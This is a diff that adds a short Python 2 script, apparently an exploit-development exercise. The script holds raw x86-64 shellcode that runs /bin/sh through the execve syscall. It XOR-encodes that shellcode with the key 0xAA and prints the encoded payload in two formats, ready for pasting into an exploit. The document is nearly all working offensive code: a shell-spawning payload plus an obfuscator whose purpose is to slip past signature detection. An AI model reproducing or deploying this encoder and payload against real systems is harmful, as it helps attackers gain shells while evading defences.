@@ -1,0 +1,25 @@
+#!/usr/bin/env python
+
+# Python XOR Encoder
+
+shellcode = ("\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43")
+
+encoded = ""
+encoded2 = ""
+
+print "Encoded shellcode ..."
+
+for x in bytearray(shellcode):
+    y = x^0xAA
+    encoded += "\\x"
+    encoded += "%02x" %y
+
+    encoded2 += '0x'
+    encoded2 += '%02x, ' %y
+
+
+print encoded
+
+print encoded2
+
+print 'Len: %d' %len(bytearray(shellcode))
